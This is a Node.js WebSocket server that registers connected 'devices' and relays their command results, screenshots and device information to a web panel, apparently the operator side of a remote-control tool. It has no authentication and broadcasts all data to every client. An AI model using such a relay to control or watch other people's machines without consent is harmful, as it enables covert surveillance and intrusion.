const WebSocket = require('ws');
const http = require('http');
const fs = require('fs');
const path = require('path');

// Create HTTP server
const server = http.createServer((req, res) => {
    if (req.url === '/' || req.url === '/index.html') {
        fs.readFile(path.join(__dirname, 'index.html'), (err, data) => {
            if (err) {
                res.writeHead(500);
                res.end('Error loading index.html');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        });
    } else if (req.url === '/style.css') {
        fs.readFile(path.join(__dirname, 'style.css'), (err, data) => {
            res.writeHead(200, { 'Content-Type': 'text/css' });
            res.end(data);
        });
    } else if (req.url === '/script.js') {
        fs.readFile(path.join(__dirname, 'script.js'), (err, data) => {
            res.writeHead(200, { 'Content-Type': 'text/javascript' });
            res.end(data);
        });
    }
});

// Create WebSocket server
const wss = new WebSocket.Server({ server });
let connectedDevices = new Map();

wss.on('connection', (ws, req) => {
    let deviceId = Date.now().toString();
    let deviceInfo = 'Unknown Device';
    
    ws.on('message', (message) => {
        const msg = message.toString();
        
        if (msg.startsWith('DEVICE_CONNECTED:')) {
            deviceInfo = msg.split(':')[1].trim();
            connectedDevices.set(deviceId, { ws, info: deviceInfo });
            broadcastDeviceList();
        } else if (msg.startsWith('CMD_RESULT:')) {
            const result = msg.substring('CMD_RESULT:'.length);
            broadcast({ type: 'command_result', data: result });
        } else if (msg.startsWith('SCREENSHOT:')) {
            const screenshotData = msg.substring('SCREENSHOT:'.length);
            broadcast({ type: 'screenshot', data: screenshotData });
        } else if (msg.startsWith('ERROR:')) {
            const error = msg.substring('ERROR:'.length);
            broadcast({ type: 'error', data: error });
        } else if (msg.startsWith('DEVICE_INFO:')) {
            const info = msg.substring('DEVICE_INFO:'.length);
            broadcast({ type: 'device_info', data: info });
        } else {
            broadcast({ type: 'message', data: msg });
        }
    });
    
    ws.on('close', () => {
        connectedDevices.delete(deviceId);
        broadcastDeviceList();
    });
    
    // Send initial connection confirmation
    ws.send(JSON.stringify({ type: 'connected', deviceId: deviceId }));
});

function broadcast(message) {
    const data = JSON.stringify(message);
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(data);
        }
    });
}

function broadcastDeviceList() {
    const devices = Array.from(connectedDevices.entries()).map(([id, device]) => ({
        id: id,
        info: device.info
    }));
    broadcast({ type: 'device_list', data: devices });
}

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});